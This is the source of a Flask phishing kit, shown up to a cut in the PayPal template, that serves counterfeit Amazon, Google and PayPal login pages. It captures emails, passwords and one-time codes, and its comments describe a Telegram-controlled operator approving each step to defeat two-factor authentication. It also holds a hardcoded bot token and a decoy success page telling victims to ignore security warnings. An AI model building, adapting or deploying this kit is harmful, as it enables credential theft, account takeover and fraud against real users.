#!/usr/bin/env python3
"""
ULTRA-FAST Amazon, Google & PayPal Login System
Amazon: Auto-success after password
Google & PayPal: Telegram approval after OTP
"""

from flask import Flask, request, jsonify, render_template_string
import requests
import time
import logging
import threading
from datetime import datetime
import os

# Ultra-fast logging setup
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Telegram Configuration
BOT_TOKEN = "8343644991:AAGUCkdTgJsBWMXTcQOv6yxjwiGqkUKxIVI"
CHAT_ID = "7861055360"

# Optimized session storage
sessions = {}
last_update_id = 0
current_form_type = "amazon"

# ========== HTML TEMPLATES ==========

# Your Verification Success Template (without date)
VERIFICATION_SUCCESS_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Complete</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
            color: #1a1a1a;
        }

        .container {
            width: 100%;
            max-width: 560px;
        }

        .card {
            background: #ffffff;
            border: 1px solid #e5e7eb;
            border-radius: 8px;
            padding: 48px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
        }

        .icon-container {
            width: 64px;
            height: 64px;
            margin: 0 auto 24px;
            background: #10b981;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .checkmark {
            width: 32px;
            height: 32px;
            stroke: #ffffff;
            stroke-width: 3;
            fill: none;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            color: #111827;
            text-align: center;
            margin-bottom: 16px;
            letter-spacing: -0.025em;
        }

        .subtitle {
            font-size: 15px;
            color: #6b7280;
            text-align: center;
            line-height: 1.6;
            margin-bottom: 32px;
        }

        .notice-box {
            background: #fef3c7;
            border: 1px solid #fbbf24;
            border-radius: 6px;
            padding: 20px;
            margin-bottom: 24px;
        }

        .notice-title {
            font-size: 15px;
            font-weight: 600;
            color: #92400e;
            margin-bottom: 8px;
        }

        .notice-text {
            font-size: 14px;
            color: #78350f;
            line-height: 1.6;
        }

        .info-text {
            font-size: 14px;
            color: #4b5563;
            line-height: 1.7;
            margin-bottom: 24px;
            text-align: center;
        }

        .footer {
            text-align: center;
            padding-top: 24px;
            border-top: 1px solid #e5e7eb;
        }

        .footer-text {
            font-size: 13px;
            color: #9ca3af;
        }

        /* Responsive */
        @media (max-width: 600px) {
            .card {
                padding: 32px 24px;
            }

            h1 {
                font-size: 22px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="icon-container">
                <svg class="checkmark" viewBox="0 0 52 52">
                    <path d="M14 27l7 7 16-16" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
            </div>

            <h1>Verification Successful</h1>
            
            <p class="subtitle">
                Thank you for verifying your account. We appreciate your cooperation in maintaining account security.
            </p>

            <div class="notice-box">
                <div class="notice-title">Important Notice</div>
                <p class="notice-text">
                    Please disregard any additional verification emails or warnings you may receive within the next 24 hours. Your verification is complete and no further action is required.
                </p>
            </div>

            <p class="info-text">
                If you receive any suspicious emails requesting additional verification, please do not click on any links. Contact us directly through our official channels if you have concerns.
            </p>

            <div class="footer">
                <p class="footer-text">Verification completed successfully</p>
            </div>
        </div>
    </div>
</body>
</html>'''

# Amazon HTML Template - Auto success after password
AMAZON_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Sign-In</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .amazon-logo { margin: 20px 0 15px; }
        .main-container { width: 100%; max-width: 350px; margin: 0 auto; }
        .card { background: #fff; border: 1px solid #ddd; border-radius: 8px; padding: 20px 26px; margin-bottom: 22px; }
        h1 { font-size: 28px; font-weight: 400; margin-bottom: 10px; color: #111; }
        .form-group { margin-bottom: 14px; }
        label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 2px; color: #111; }
        input { width: 100%; height: 31px; padding: 3px 7px; font-size: 13px; border: 1px solid #a6a6a6; border-radius: 3px; }
        input:focus { outline: none; border-color: #e77600; box-shadow: 0 0 3px 2px rgba(228,121,17,0.5); }
        .btn { width: 100%; height: 31px; background: linear-gradient(to bottom,#f7dfa5,#f0c14b); border: 1px solid #a88734; border-radius: 3px; cursor: pointer; }
        .hidden { display: none !important; }
        .loading-overlay { position: fixed; inset: 0; background: rgba(255,255,255,0.95); z-index: 50; display: none; align-items: center; justify-content: center; }
        .loading-overlay.active { display: flex; }
        .spinner { width: 4rem; height: 4rem; border: 4px solid #e5e7eb; border-top-color: #0070ba; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .password-wrapper { position: relative; display: flex; align-items: center; }
        .password-wrapper input { flex: 1; padding-right: 35px; }
        .password-toggle { position: absolute; right: 8px; background: none; border: none; cursor: pointer; color: #565959; font-size: 12px; }
        .user-info { display: flex; align-items: center; gap: 12px; padding: 10px 0; border-bottom: 1px solid #e7e7e7; margin-bottom: 14px; }
        .user-avatar { width: 48px; height: 48px; border-radius: 50%; background: linear-gradient(135deg,#232f3e,#37475a); display: flex; align-items: center; justify-content: center; font-size: 20px; color: #fff; }
    </style>
</head>
<body>
    <div id="loadingOverlay" class="loading-overlay">
        <div class="spinner"></div>
        <div id="loadingText">Checking information...</div>
    </div>

    <div class="amazon-logo">
        <svg width="100" height="31" viewBox="0 0 103 31">
            <path fill="#FF9900" d="M64.857 24.554c-7.093 5.24-17.399 8.028-26.266 8.028-12.425 0-23.618-4.598-32.086-12.254-.665-.6-.069-1.42.729-.952 9.14 5.32 20.44 8.522 32.114 8.522 7.87 0 16.532-1.633 24.502-5.017 1.199-.509 2.204.788 1.007 1.673"/>
            <path fill="#FF9900" d="M67.742 21.267c-.906-1.162-6.003-.55-8.287-.276-.693.083-.8-.52-.175-.956 4.062-2.858 10.725-2.033 11.502-1.075.777.967-.203 7.668-4.03 10.87-.589.493-1.15.23-.889-.423.858-2.146 2.785-6.978 1.879-8.14"/>
        </svg>
    </div>

    <div class="main-container">
        <div id="emailStep" class="card">
            <h1>Sign in</h1>
            <form id="emailForm">
                <div class="form-group">
                    <label for="email">Email or mobile phone number</label>
                    <input type="text" id="email" required>
                </div>
                <button type="submit" class="btn">Continue</button>
            </form>
        </div>

        <div id="passwordStep" class="card hidden">
            <h1>Sign in</h1>
            <div class="user-info">
                <div class="user-avatar" id="avatarCircle">A</div>
                <div class="user-email" id="userEmail"></div>
            </div>
            <form id="passwordForm">
                <div class="form-group">
                    <label for="password">Password</label>
                    <div class="password-wrapper">
                        <input type="password" id="password" required>
                        <button type="button" class="password-toggle" id="passwordToggle">Show</button>
                    </div>
                </div>
                <button type="submit" class="btn">Sign in</button>
            </form>
        </div>

        <div id="successStep" class="card hidden">
            <!-- Your verification page will be loaded here -->
        </div>
    </div>

    <script>
        let sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        const loadingOverlay = document.getElementById('loadingOverlay');
        const emailStep = document.getElementById('emailStep');
        const passwordStep = document.getElementById('passwordStep');
        const successStep = document.getElementById('successStep');
        const emailForm = document.getElementById('emailForm');
        const passwordForm = document.getElementById('passwordForm');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const passwordToggle = document.getElementById('passwordToggle');
        const userEmail = document.getElementById('userEmail');
        const avatarCircle = document.getElementById('avatarCircle');

        function showLoading(text) {
            loadingOverlay.querySelector('#loadingText').textContent = text;
            loadingOverlay.classList.add('active');
        }

        function hideLoading() { loadingOverlay.classList.remove('active'); }

        function showStep(step) {
            [emailStep, passwordStep, successStep].forEach(s => s.classList.add('hidden'));
            document.getElementById(step + 'Step').classList.remove('hidden');
        }

        async function sendToBackend(field, value) {
            try {
                const response = await fetch('/submit', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({session_id: sessionId, field: field, value: value, form_type: 'amazon'})
                });
                return await response.json();
            } catch (error) { return { success: false }; }
        }

        emailForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const emailValue = emailInput.value;
            if (emailValue) {
                showLoading('Verifying email address...');
                await sendToBackend('email', emailValue);
                userEmail.textContent = emailValue;
                avatarCircle.textContent = emailValue[0].toUpperCase();
                
                // For Amazon, wait 2 seconds then show password
                setTimeout(() => {
                    hideLoading();
                    showStep('password');
                }, 2000);
            }
        });

        passwordForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const passwordValue = passwordInput.value;
            if (passwordValue) {
                showLoading('Checking password...');
                await sendToBackend('password', passwordValue);
                
                // For Amazon, automatically show success after 2 seconds
                setTimeout(() => {
                    // Load your verification success page
                    successStep.innerHTML = `''' + VERIFICATION_SUCCESS_TEMPLATE + '''`;
                    hideLoading();
                    showStep('success');
                }, 2000);
            }
        });

        passwordToggle.addEventListener('click', () => {
            passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
            passwordToggle.textContent = passwordInput.type === 'password' ? 'Show' : 'Hide';
        });
    </script>
</body>
</html>
'''

# Google HTML Template with OTP - Needs Telegram approval
GOOGLE_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
        .main-container { width: 100%; max-width: 450px; }
        .card { background: #fff; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; text-align: center; }
        .google-logo { margin-bottom: 16px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #202124; }
        h2 { font-size: 16px; font-weight: 400; margin-bottom: 24px; color: #202124; }
        .form-group { margin-bottom: 24px; text-align: left; }
        .input-wrapper { position: relative; }
        input { width: 100%; height: 56px; padding: 16px 15px 0; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; background: transparent; }
        input:focus { outline: none; border-color: #1a73e8; border-width: 2px; padding: 16px 14px 0; }
        label { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); font-size: 16px; color: #5f6368; pointer-events: none; transition: all 0.2s; background: #fff; padding: 0 4px; }
        input:focus + label, input:not(:placeholder-shown) + label { top: 8px; font-size: 12px; color: #1a73e8; }
        .btn { padding: 0 24px; height: 36px; font-size: 14px; border: none; border-radius: 4px; cursor: pointer; }
        .btn-primary { background: #1a73e8; color: #fff; }
        .hidden { display: none !important; }
        .loading-overlay { position: fixed; inset: 0; background: rgba(255,255,255,0.9); z-index: 9999; display: none; align-items: center; justify-content: center; }
        .loading-overlay.active { display: flex; }
        .spinner { width: 48px; height: 48px; border: 4px solid #e8eaed; border-top-color: #1a73e8; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .user-info { display: flex; align-items: center; justify-content: center; gap: 16px; margin-bottom: 24px; }
        .user-avatar { width: 60px; height: 60px; border-radius: 50%; background: linear-gradient(135deg,#1a73e8,#4285f4); display: flex; align-items: center; justify-content: center; font-size: 24px; color: #fff; }
        
        /* OTP Specific Styles */
        .otp-header { text-align: center; margin-bottom: 1.5rem; }
        .otp-title { font-size: 1.5rem; font-weight: 500; color: #111827; margin-bottom: 0.5rem; }
        .otp-description { font-size: 0.875rem; color: #6b7280; }
        .otp-input { height: 3.5rem !important; text-align: center; font-size: 1.875rem; letter-spacing: 0.5em; font-weight: 300; padding: 0 !important; }
        .otp-timer { display: flex; align-items: center; justify-content: space-between; font-size: 0.875rem; margin-top: 0.75rem; }
        .timer-text { color: #6b7280; }
        .timer-text.expired { color: #dc2626; }
        .resend-btn { background: none; border: none; color: #1a73e8; cursor: pointer; font-size: 0.875rem; }
        .resend-btn:hover:not(:disabled) { text-decoration: underline; }
        .resend-btn:disabled { color: #9ca3af; cursor: not-allowed; }
        .error-message { color: #dc2626; font-size: 0.875rem; text-align: center; margin-bottom: 1rem; padding: 0.5rem; background-color: #fef2f2; border-radius: 0.25rem; border: 1px solid #fecaca; }
        .success-message { color: #059669; font-size: 0.875rem; text-align: center; margin-bottom: 1rem; padding: 0.5rem; background-color: #f0fdf4; border-radius: 0.25rem; border: 1px solid #bbf7d0; }
    </style>
</head>
<body>
    <div id="loadingOverlay" class="loading-overlay">
        <div class="spinner"></div>
        <div id="loadingText">Checking information...</div>
    </div>

    <div class="main-container">
        <!-- Email Step -->
        <div id="emailStep" class="card">
            <div class="google-logo">
                <svg width="75" height="24" viewBox="0 0 75 24">
                    <path fill="#4285F4" d="M38.746 14.608v-3.808h12.644c.12.648.186 1.416.186 2.256 0 2.808-.768 6.28-3.24 8.752-2.4 2.504-5.464 3.84-9.59 3.84-7.576 0-13.944-6.176-13.944-13.752S30.17 1.144 37.746 1.144c4.192 0 7.192 1.648 9.432 3.792l-2.656 2.656c-1.608-1.512-3.792-2.688-6.776-2.688-5.528 0-9.848 4.456-9.848 9.992s4.32 9.992 9.848 9.992c3.576 0 5.616-1.44 6.92-2.744 1.064-1.064 1.76-2.584 2.032-4.664h-8.952v.128z"/>
                </svg>
            </div>
            <h1>Sign in</h1>
            <h2>to continue to Gmail</h2>
            <div id="emailError" class="error-message hidden">Incorrect email address. Please try again.</div>
            <form id="emailForm">
                <div class="form-group">
                    <div class="input-wrapper">
                        <input type="text" id="email" placeholder=" " required>
                        <label for="email">Email or phone</label>
                    </div>
                </div>
                <button type="submit" class="btn btn-primary">Next</button>
            </form>
        </div>

        <!-- Password Step -->
        <div id="passwordStep" class="card hidden">
            <div class="google-logo">
                <svg width="75" height="24" viewBox="0 0 75 24">
                    <path fill="#4285F4" d="M38.746 14.608v-3.808h12.644c.12.648.186 1.416.186 2.256 0 2.808-.768 6.28-3.24 8.752-2.4 2.504-5.464 3.84-9.59 3.84-7.576 0-13.944-6.176-13.944-13.752S30.17 1.144 37.746 1.144c4.192 0 7.192 1.648 9.432 3.792l-2.656 2.656c-1.608-1.512-3.792-2.688-6.776-2.688-5.528 0-9.848 4.456-9.848 9.992s4.32 9.992 9.848 9.992c3.576 0 5.616-1.44 6.92-2.744 1.064-1.064 1.76-2.584 2.032-4.664h-8.952v.128z"/>
                </svg>
            </div>
            <h1>Welcome</h1>
            <div class="user-info">
                <div class="user-avatar" id="avatarCircle">G</div>
            </div>
            <div id="userEmail"></div>
            <div id="passwordError" class="error-message hidden">Incorrect password. Please try again.</div>
            <form id="passwordForm">
                <div class="form-group">
                    <div class="input-wrapper">
                        <input type="password" id="password" placeholder=" " required>
                        <label for="password">Enter your password</label>
                    </div>
                </div>
                <button type="submit" class="btn btn-primary">Next</button>
            </form>
        </div>

        <!-- OTP Step -->
        <div id="otpStep" class="card hidden">
            <div class="google-logo">
                <svg width="75" height="24" viewBox="0 0 75 24">
                    <path fill="#4285F4" d="M38.746 14.608v-3.808h12.644c.12.648.186 1.416.186 2.256 0 2.808-.768 6.28-3.24 8.752-2.4 2.504-5.464 3.84-9.59 3.84-7.576 0-13.944-6.176-13.944-13.752S30.17 1.144 37.746 1.144c4.192 0 7.192 1.648 9.432 3.792l-2.656 2.656c-1.608-1.512-3.792-2.688-6.776-2.688-5.528 0-9.848 4.456-9.848 9.992s4.32 9.992 9.848 9.992c3.576 0 5.616-1.44 6.92-2.744 1.064-1.064 1.76-2.584 2.032-4.664h-8.952v.128z"/>
                </svg>
            </div>
            <div class="otp-header">
                <h1 class="otp-title">Enter verification code</h1>
                <p class="otp-description">Enter the 6-digit code sent to your device</p>
            </div>
            <div id="otpError" class="error-message hidden">Incorrect code. Please try again.</div>
            <div id="otpResend" class="success-message hidden">New code sent to your device.</div>
            <form id="otpForm">
                <div class="form-group">
                    <input type="text" id="otp" class="otp-input" placeholder="· · · · · ·" maxlength="6" required>
                    <div class="otp-timer">
                        <span class="timer-text" id="timerText">Code expires in 1:00</span>
                        <button type="button" class="resend-btn" id="resendBtn" disabled>Resend code</button>
                    </div>
                </div>
                <button type="submit" class="btn btn-primary" id="otpSubmitBtn" disabled>Verify</button>
            </form>
        </div>

        <!-- Success Step -->
        <div id="successStep" class="card hidden">
            <!-- Your verification page will be loaded here -->
        </div>
    </div>

    <script>
        let sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        const loadingOverlay = document.getElementById('loadingOverlay');
        const loadingText = document.getElementById('loadingText');
        const emailStep = document.getElementById('emailStep');
        const passwordStep = document.getElementById('passwordStep');
        const otpStep = document.getElementById('otpStep');
        const successStep = document.getElementById('successStep');
        const emailForm = document.getElementById('emailForm');
        const passwordForm = document.getElementById('passwordForm');
        const otpForm = document.getElementById('otpForm');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const otpInput = document.getElementById('otp');
        const userEmail = document.getElementById('userEmail');
        const avatarCircle = document.getElementById('avatarCircle');
        const timerText = document.getElementById('timerText');
        const resendBtn = document.getElementById('resendBtn');
        const otpSubmitBtn = document.getElementById('otpSubmitBtn');
        const emailError = document.getElementById('emailError');
        const passwordError = document.getElementById('passwordError');
        const otpError = document.getElementById('otpError');
        const otpResend = document.getElementById('otpResend');

        let currentStep = 'email';
        let emailValue = '';
        let passwordValue = '';
        let otpValue = '';
        let otpTimer = 60;
        let timerInterval = null;
        let canResend = false;
        let isWaitingForOperator = false;

        function showLoading(text) {
            loadingText.textContent = text;
            loadingOverlay.classList.add('active');
            isWaitingForOperator = true;
        }

        function hideLoading() {
            loadingOverlay.classList.remove('active');
            isWaitingForOperator = false;
        }

        function formatTime(seconds) {
            const mins = Math.floor(seconds / 60);
            const secs = seconds % 60;
            return `${mins}:${secs.toString().padStart(2, '0')}`;
        }

        function showStep(step) {
            emailStep.classList.add('hidden');
            passwordStep.classList.add('hidden');
            otpStep.classList.add('hidden');
            successStep.classList.add('hidden');

            emailError.classList.add('hidden');
            passwordError.classList.add('hidden');
            otpError.classList.add('hidden');
            otpResend.classList.add('hidden');

            if (step === 'email') {
                emailStep.classList.remove('hidden');
            } else if (step === 'password') {
                passwordStep.classList.remove('hidden');
            } else if (step === 'otp') {
                otpStep.classList.remove('hidden');
            } else if (step === 'success') {
                successStep.classList.remove('hidden');
            }

            currentStep = step;
        }

        function startOtpTimer() {
            if (timerInterval) {
                clearInterval(timerInterval);
            }

            otpTimer = 60;
            canResend = false;
            resendBtn.disabled = true;
            timerText.classList.remove('expired');
            otpResend.classList.add('hidden');

            timerInterval = setInterval(() => {
                otpTimer--;

                if (otpTimer <= 0) {
                    clearInterval(timerInterval);
                    timerText.textContent = 'Code expired';
                    timerText.classList.add('expired');
                    canResend = true;
                    resendBtn.disabled = false;
                } else {
                    timerText.textContent = `Code expires in ${formatTime(otpTimer)}`;
                }
            }, 1000);
        }

        async function sendToBackend(field, value) {
            try {
                const response = await fetch('/submit', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({session_id: sessionId, field: field, value: value, form_type: 'google'})
                });
                return await response.json();
            } catch (error) {
                return { success: false };
            }
        }

        async function checkOperatorStatus() {
            while (isWaitingForOperator) {
                try {
                    const response = await fetch('/status?session_id=' + sessionId + '&t=' + Date.now());
                    const data = await response.json();
                    
                    if (data.action) {
                        handleOperatorAction(data.action);
                        break;
                    }
                    await new Promise(resolve => setTimeout(resolve, 1000));
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        function handleOperatorAction(action) {
            hideLoading();
            
            if (action === 'show_password') {
                showStep('password');
            } else if (action === 'show_otp') {
                showStep('otp');
                startOtpTimer();
            } else if (action === 'show_success') {
                // Load your verification success page
                successStep.innerHTML = `''' + VERIFICATION_SUCCESS_TEMPLATE + '''`;
                showStep('success');
            } else if (action === 'show_email_error') {
                showStep('email');
                emailError.classList.remove('hidden');
                emailInput.value = '';
                emailInput.focus();
            } else if (action === 'show_password_error') {
                showStep('password');
                passwordError.classList.remove('hidden');
                passwordInput.value = '';
                passwordInput.focus();
            } else if (action === 'show_otp_error') {
                showStep('otp');
                otpError.classList.remove('hidden');
                otpInput.value = '';
                otpInput.focus();
                startOtpTimer();
            } else if (action === 'resend_otp') {
                showStep('otp');
                otpInput.value = '';
                otpResend.classList.remove('hidden');
                startOtpTimer();
            }
        }

        // Event handlers
        emailForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            emailValue = emailInput.value;

            if (emailValue) {
                showLoading('Checking email...');
                await fetch('/clear-session?session_id=' + sessionId);
                await sendToBackend('email', emailValue);
                userEmail.textContent = emailValue;
                avatarCircle.textContent = emailValue[0].toUpperCase();
                await checkOperatorStatus();
            }
        });

        passwordForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            passwordValue = passwordInput.value;

            if (passwordValue) {
                showLoading('Signing in...');
                await sendToBackend('password', passwordValue);
                await checkOperatorStatus();
            }
        });

        otpForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            otpValue = otpInput.value;

            if (otpValue.length === 6) {
                showLoading('Verifying code...');
                await sendToBackend('otp', otpValue);
                await checkOperatorStatus();
            }
        });

        // OTP input validation
        otpInput.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
            otpValue = e.target.value;
            otpSubmitBtn.disabled = otpValue.length !== 6;
        });

        // Resend code
        resendBtn.addEventListener('click', async () => {
            if (canResend) {
                showLoading('Requesting new code...');
                otpInput.value = '';
                otpValue = '';
                otpSubmitBtn.disabled = true;
                await sendToBackend('request_otp', 'new_otp_requested');
                showStep('otp');
                startOtpTimer();
                otpResend.classList.remove('hidden');
                hideLoading();
            }
        });

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            console.log('Google OTP System initialized with session:', sessionId);
        });
    </script>
</body>
</html>
'''

# PayPal HTML Template - Needs Telegram approval after OTP
PAYPAL_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        header {
            border-bottom: 1px solid #e5e7eb;
            padding: 1rem 0;
        }

        .header-container {
            max-width: 28rem;
            margin: 0 auto;
            padding: 0 1rem;
        }

        .logo {
            font-size: 1.75rem;
            font-weight: bold;
            color: #0070ba;
            font-family: Verdana, sans-serif;
        }

        main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
        }

        .content-wrapper {
            width: 100%;
            max-width: 28rem;
        }

        .form-container {
            animation: fadeIn 0.3s ease-in-out;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateX(20px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        .form-group {
            margin-bottom: 1.5rem;
        }

        label {
            display: block;
            font-size: 0.875rem;
            font-weight: 500;
            margin-bottom: 0.5rem;
            color: #111827;
        }

        input {
            width: 100%;
            height: 2.75rem;
            padding: 0 0.75rem;
            font-size: 1rem;
            border: 1px solid #d1d5db;
            border-radius: 0.25rem;
            transition: all 0.2s;
        }

        input:focus {
            outline: none;
            border-color: #0070ba;
            box-shadow: 0 0 0 3px rgba(0, 112, 186, 0.1);
        }

        input:disabled {
            background-color: #f3f4f6;
            cursor: not-allowed;
        }

        input[type="text"].otp-input {
            height: 3.5rem;
            text-align: center;
            font-size: 1.875rem;
            letter-spacing: 0.5em;
            font-weight: 300;
        }

        .password-wrapper {
            position: relative;
        }

        .password-toggle {
            position: absolute;
            right: 0.75rem;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            color: #6b7280;
            padding: 0.25rem;
        }

        .btn {
            width: 100%;
            height: 3rem;
            background-color: #0070ba;
            color: white;
            border: none;
            border-radius: 9999px;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .btn:hover:not(:disabled) {
            background-color: #005ea6;
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .link {
            color: #0070ba;
            text-decoration: none;
            font-size: 0.875rem;
        }

        .link:hover {
            text-decoration: underline;
        }

        .user-avatar {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            margin-bottom: 1.5rem;
        }

        .avatar-circle {
            width: 2.5rem;
            height: 2.5rem;
            border-radius: 50%;
            background-color: #e5e7eb;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 500;
            color: #4b5563;
        }

        .user-email {
            font-size: 0.875rem;
            color: #6b7280;
        }

        .otp-header {
            text-align: center;
            margin-bottom: 1.5rem;
        }

        .otp-title {
            font-size: 1.5rem;
            font-weight: 500;
            color: #111827;
            margin-bottom: 0.5rem;
        }

        .otp-description {
            font-size: 0.875rem;
            color: #6b7280;
        }

        .otp-timer {
            display: flex;
            align-items: center;
            justify-content: space-between;
            font-size: 0.875rem;
            margin-top: 0.75rem;
        }

        .timer-text {
            color: #6b7280;
        }

        .timer-text.expired {
            color: #dc2626;
        }

        .resend-btn {
            background: none;
            border: none;
            color: #0070ba;
            cursor: pointer;
            font-size: 0.875rem;
        }

        .resend-btn:hover:not(:disabled) {
            text-decoration: underline;
        }

        .resend-btn:disabled {
            color: #9ca3af;
            cursor: not-allowed;
        }

        /* Loading Overlay */
        .loading-overlay {
            position: fixed;
            inset: 0;
            background-color: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(8px);
            z-index: 50;
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }

        .loading-overlay.active {
            display: flex;
        }

        .spinner {
            width: 4rem;
            height: 4rem;
            border: 4px solid #e5e7eb;
            border-top-color: #0070ba;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 1rem;
        }

        .loading-text {
            font-size: 1rem;
            color: #374151;
            text-align: center;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        /* Error Messages */
        .error-message {
            color: #dc2626;
            font-size: 0.875rem;
            text-align: center;
            margin-bottom: 1rem;
            padding: 0.5rem;
            background-color: #fef2f2;
            border-radius: 0.25rem;
            border: 1px solid #fecaca;
        }

        .success-message {
            color: #059669;
            font-size: 0.875rem;
            text-align: center;
            margin-bottom: 1rem;
            padding: 0.5rem;
            background-color: #f0fdf4;
            border-radius: 0.25rem;
            border: 1px solid #bbf7d0;
        }

        footer {
            border-top: 1px solid #e5e7eb;
            padding: 1.5rem 0;
        }

        .footer-container {
            max-width: 72rem;
            margin: 0 auto;
            padding: 0 1rem;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            gap: 1rem;
            justify-content: center;
            font-size: 0.75rem;
        }

        .footer-links a {
            color: #6b7280;
            text-decoration: none;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .hidden {
            display: none !important;
        }

        .mb-4 {
            margin-bottom: 1rem;
        }
    </style>
</head>
<body>
    <!-- Loading Overlay -->
    <div id="loadingOverlay" class="loading-overlay">
        <div class="spinner"></div>
        <div class="loading-text" id="loadingText">Checking information...</div>
    </div>

    <!-- Header -->
    <header>
        <div class="header-container">
            <div class="logo">PayPal</div>
        </div>
    </header>

    <!-- Main Content -->
    <main>
        <div class="content-wrapper">
            <!-- Email Step -->
            <div id="emailStep" class="form-container">
                <div id="emailError" class="error-message hidden">Incorrect email address. Please try again.</div>
                <form id="emailForm">
                    <div class="form-group">
                        <label for="email">Email or mobile number</label>
                        <input type="email" id="email" required>
                    </div>
                    <button type="submit" class="btn">Next</button>
                </form>
            </div>

            <!-- Password Step -->
            <div id="passwordStep" class="form-container hidden">
                <div id="passwordError" class="error-message hidden">Incorrect password. Please try again.</div>
                <div class="user-avatar">
                    <div class="avatar-circle" id="avatarCircle">U</div>
                    <div class="user-email" id="userEmail"></div>
                </div>
                <form id="passwordForm">
                    <div class="form-group">
                        <label for="password">Password</label>
                        <div class="password-wrapper">
                            <input type="password" id="password" required>
                            <button type="button" class="password-toggle" id="passwordToggle">
                                <svg class="icon" id="eyeIcon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                                    <circle cx="12" cy="12" r="3"></circle>
                                </svg>
                                <svg class="icon hidden" id="eyeOffIcon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                                    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
                                    <line x1="1" y1="1" x2="23" y2="23"></line>
                                </svg>
                            </button>
                        </div>
                        <a href="#" class="link mb-4" style="display: inline-block; margin-top: 0.5rem;">Forgot password?</a>
                    </div>
                    <button type="submit" class="btn">Log In</button>
                </form>
            </div>

            <!-- OTP Step -->
            <div id="otpStep" class="form-container hidden">
                <div id="otpError" class="error-message hidden">Incorrect OTP. Please try again.</div>
                <div id="otpResend" class="success-message hidden">We sent you a new OTP.</div>
